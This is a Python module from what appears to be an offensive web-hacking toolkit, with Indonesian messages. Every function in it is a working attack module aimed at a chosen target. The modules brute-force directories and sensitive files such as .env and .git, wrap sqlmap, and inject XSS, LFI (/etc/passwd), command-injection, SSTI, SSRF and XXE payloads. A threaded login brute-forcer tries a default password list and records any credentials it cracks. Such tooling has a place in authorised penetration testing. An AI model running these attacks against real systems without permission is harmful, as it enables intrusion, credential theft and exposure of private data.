# -*- coding: utf-8 -*-
"""Web application hacking."""
import base64
import json
import re

from ..core import netutil as nu
from ._base import MODULES, mod

WORDLIST = ["admin", "login", "wp-admin", "wp-login.php", "api", "v1", "v2", "config",
            "backup", ".git/HEAD", ".env", "robots.txt", "sitemap.xml", "phpinfo.php",
            "server-status", "uploads", "assets", "js", "css", "dashboard", "user",
            "users", "admin.php", "db.sql", "backup.zip", "test", "dev", "staging",
            "console", "graphql", "swagger", "api-docs", "metrics", "health", ".htaccess",
            "composer.json", "package.json", "Dockerfile", "trace", "actuator"]


def _url(ctx):
    t = ctx.p("target")
    return t if t.startswith("http") else "http://" + t


@mod(name="web.dirbust", category="web", desc="Bruteforce direktori/file (threaded)",
     params={"target": {"required": True, "desc": "base URL"},
             "wordlist": {"default": None}, "threads": {"default": 24}})
def dirbust(ctx):
    base = _url(ctx).rstrip("/")
    words = list(WORDLIST)
    if ctx.p("wordlist"):
        try:
            words = [l.strip() for l in open(ctx.p("wordlist")) if l.strip()][:8000]
        except Exception:
            pass

    def probe(p):
        status, headers, body = nu.http_get(f"{base}/{p}", 8)
        if status in (200, 204, 301, 302, 401, 403, 500):
            return (status, p, len(body), headers.get("Location", ""))
        return None

    for status, p, size, loc in nu.parallel(words, probe, ctx.pi("threads")):
        sev = "medium" if status in (200, 401) and any(
            k in p for k in ("admin", "backup", ".git", ".env", "config", "db", "sql")) else "info"
        ctx.out(f"  {status} /{p} ({size} B) {loc}")
        ctx.finding(f"path {status} /{p}", sev, f"{size} byte", loc)
    return f"{len(words)} kata diuji"


@mod(name="web.sqlmap", category="web", desc="sqlmap batch", needs=["sqlmap"],
     params={"target": {"required": True, "desc": "URL berparameter"}})
def sqlmap(ctx):
    rc, out, err = ctx.exec(["sqlmap", "-u", _url(ctx), "--batch", "--dbs", "--level", "2"], 2400)
    ctx.out(out[-6000:] if len(out) > 6000 else (out or err))
    if re.search(r"(?i)injectable|Parameter:|back-end DBMS", out):
        ctx.finding("SQL injection terkonfirmasi", "high", "sqlmap injectable", out[-2000:])
    ctx.artifact("sqlmap.txt", out)
    return "sqlmap selesai"


@mod(name="web.xss", category="web", desc="Uji refleksi XSS",
     params={"target": {"required": True, "desc": "URL dengan parameter"}})
def xss(ctx):
    u = _url(ctx)
    vecs = ['"><script>alert(1)</script>', "'><img src=x onerror=alert(1)>",
            '"><svg/onload=alert(1)>', "javascript:alert(1)"]
    for v in vecs:
        test = re.sub(r"=([^&]*)", "=" + v.replace("&", "%26"), u, count=1) \
            if "=" in u else u + "?q=" + v
        status, _, body = nu.http_get(test, 12)
        text = body.decode(errors="ignore")
        hit = "alert(1)" in text
        ctx.out(f"  {'REFLECT' if hit else '   -   '} {v}")
        if hit:
            ctx.finding("refleksi XSS", "medium", v, test)
    return "xss selesai"


@mod(name="web.fuzz", category="web", desc="Fuzz parameter (sqli/xss/lfi/rce/ssti/ssrf)",
     params={"target": {"required": True, "desc": "URL dengan parameter"}})
def fuzz(ctx):
    u = _url(ctx)
    sigs = {"sqli": ("'", "SQL"), "xss": ("<script>alert(1)</script>", "alert(1)"),
            "lfi": ("../../../../etc/passwd", "root:x:"), "rce": (";id", "uid="),
            "ssti": ("{{7*7}}", "49"), "ssrf": ("http://127.0.0.1:80", ""),
            "xxe": ("<!ENTITY x SYSTEM 'file:///etc/passwd'>", "")}
    for name, (val, sig) in sigs.items():
        test = re.sub(r"=([^&]*)", "=" + val.replace("&", "%26"), u, count=1) \
            if "=" in u else u + "?q=" + val
        status, _, body = nu.http_get(test, 12)
        text = body.decode(errors="ignore")
        hit = bool(sig) and sig in text
        ctx.out(f"  {name:5} {'HIT' if hit else '-'}")
        if hit:
            ctx.finding(f"indikasi {name}", "high", val, test)
    return "fuzz selesai"


@mod(name="web.api", category="web", desc="Discovery spec API / GraphQL / actuator",
     params={"target": {"required": True, "desc": "base URL"}})
def api(ctx):
    base = _url(ctx).rstrip("/")
    paths = ["/swagger.json", "/openapi.json", "/api-docs", "/v2/api-docs", "/graphql",
             "/actuator", "/actuator/env", "/actuator/health", "/.well-known/openapi.json"]
    for p in paths:
        status, headers, body = nu.http_get(base + p, 10)
        if status in (200, 401, 403):
            text = body.decode(errors="ignore")[:2500]
            ctx.out(f"  [{status}] {p}")
            ctx.finding(f"endpoint API {p}", "medium", f"status {status}", text)
            if "openapi" in text.lower() or "swagger" in text.lower():
                ctx.finding("spec API terbuka", "medium", p, text[:1500])
    return "api discovery selesai"


@mod(name="web.jwt", category="web", desc="Dekode & audit JWT",
     params={"target": {"required": True, "desc": "token JWT"}})
def jwt(ctx):
    tok = ctx.p("target")
    parts = tok.split(".")
    if len(parts) != 3:
        ctx.out("  bukan JWT valid"); return None
    def dec(seg):
        seg += "=" * (-len(seg) % 4)
        try:
            return json.loads(base64.urlsafe_b64decode(seg))
        except Exception:
            return {"error": "decode gagal"}
    header, payload = dec(parts[0]), dec(parts[1])
    ctx.out("  header: " + json.dumps(header))
    ctx.out("  payload: " + json.dumps(payload))
    ctx.finding("JWT didekode", "info", json.dumps(header), json.dumps(payload))
    alg = str(header.get("alg", "")).lower()
    if alg == "none":
        ctx.finding("JWT alg none", "high", "token tanpa signature")
    if alg.startswith("hs"):
        ctx.finding("JWT HMAC", "low", f"alg {alg} — cek brute secret")
    for k in ("exp", "iat"):
        if k not in payload:
            ctx.finding(f"JWT tanpa {k}", "low", "klaim tidak ada")
    return "jwt selesai"


@mod(name="web.cors", category="web", desc="Uji konfigurasi CORS",
     params={"target": {"required": True, "desc": "URL"}})
def cors(ctx):
    for origin in ("https://evil.example", "null"):
        status, headers, _ = nu.http_get(_url(ctx), 12, {"Origin": origin})
        acao = headers.get("Access-Control-Allow-Origin", "")
        acac = headers.get("Access-Control-Allow-Credentials", "")
        ctx.out(f"  Origin {origin} -> ACAO={acao or '-'} ACAC={acac or '-'}")
        if acao in ("*", origin):
            ctx.finding("CORS permisif", "medium" if acac else "low", f"ACAO={acao}", f"origin {origin}")
    return "cors selesai"


@mod(name="web.methods", category="web", desc="Enumerasi HTTP method",
     params={"target": {"required": True, "desc": "URL"}})
def methods(ctx):
    import http.client
    from urllib.parse import urlparse
    u = urlparse(_url(ctx))
    for m in ("GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE"):
        try:
            c = http.client.HTTPConnection(u.netloc, timeout=8)
            c.request(m, u.path or "/")
            r = c.getresponse()
            allow = r.getheader("Allow", "")
            ctx.out(f"  {m:7} {r.status} {allow}")
            if r.status < 400 and m in ("PUT", "DELETE", "TRACE"):
                ctx.finding(f"method {m} aktif", "low", str(r.status))
            c.close()
        except Exception as e:
            ctx.out(f"  {m:7} err {e}")
    return "methods selesai"


@mod(name="web.authbrute", category="web", desc="Bruteforce form login HTTP",
     params={"target": {"required": True, "desc": "URL form"},
             "user_field": {"default": "username"}, "pass_field": {"default": "password"},
             "users": {"default": "admin", "desc": "user dipisah koma"},
             "wordlist": {"default": None}, "threads": {"default": 8}})
def authbrute(ctx):
    import urllib.parse
    url = _url(ctx)
    users = [u.strip() for u in ctx.p("users").split(",")]
    if ctx.p("wordlist"):
        try:
            pwds = [l.strip() for l in open(ctx.p("wordlist")) if l.strip()][:5000]
        except Exception:
            pwds = ["admin"]
    else:
        pwds = ["admin", "password", "123456", "admin123", "root", "toor", "letmein",
                "qwerty", "password123", "changeme"]

    def attempt(pair):
        u, p = pair
        data = urllib.parse.urlencode({ctx.p("user_field"): u, ctx.p("pass_field"): p}).encode()
        status, headers, body = nu.http_get(url + "?" + data.decode(), 12)
        text = body.decode(errors="ignore").lower()
        ok = status in (301, 302) or any(k in text for k in ("logout", "dashboard", "selamat datang", "welcome"))
        return (u, p, status) if ok else None

    pairs = [(u, p) for u in users for p in pwds]
    for r in nu.parallel(pairs, attempt, ctx.pi("threads")):
        ctx.out(f"  HIT {r[0]}:{r[1]} ({r[2]})")
        ctx.cred(r[0], r[1], "password", "web.authbrute")
    return f"{len(pairs)} percobaan"


@mod(name="web.exposure", category="web", desc="Cek file sensitif terbuka",
     params={"target": {"required": True, "desc": "base URL"}})
def exposure(ctx):
    base = _url(ctx).rstrip("/")
    files = ["/.git/config", "/.env", "/.svn/entries", "/backup.zip", "/backup.sql",
             "/db.sql", "/config.php.bak", "/.DS_Store", "/phpinfo.php", "/server-status"]
    for f in files:
        status, _, body = nu.http_get(base + f, 10)
        if status == 200 and len(body) > 20:
            text = body.decode(errors="ignore")[:1200]
            ctx.out(f"  [{status}] {f} ({len(body)} B)")
            sev = "high" if any(k in f for k in (".env", ".git", "sql", "backup")) else "medium"
            ctx.finding(f"file sensitif {f}", sev, f"{len(body)} byte", text)
    return "exposure selesai"


@mod(name="web.subtakeover", category="web", desc="Deteksi subdomain takeover (CNAME yatim)",
     params={"target": {"required": True, "desc": "daftar subdomain dipisah koma"}})
def takeover(ctx):
    fps = {"s3.amazonaws.com": "NoSuchBucket", "github.io": "404", "herokuapp.com": "No such app",
           "azurewebsites.net": "404 Web Site not found", "cloudfront.net": "Bad Request"}
    for host in [h.strip() for h in ctx.p("target").split(",") if h.strip()]:
        rc, out, _ = ctx.exec(["dig", "+short", "CNAME", host], 15)
        cname = out.strip().lower()
        if not cname:
            continue
        for fp, marker in fps.items():
            if fp in cname:
                status, _, body = nu.http_get("http://" + host, 12)
                if marker.lower() in body.decode(errors="ignore").lower():
                    ctx.out(f"  VULN {host} -> {cname}")
                    ctx.finding("subdomain takeover", "high", f"{host} -> {cname}", marker)
                else:
                    ctx.out(f"  ok   {host} -> {cname}")
    return "takeover selesai"
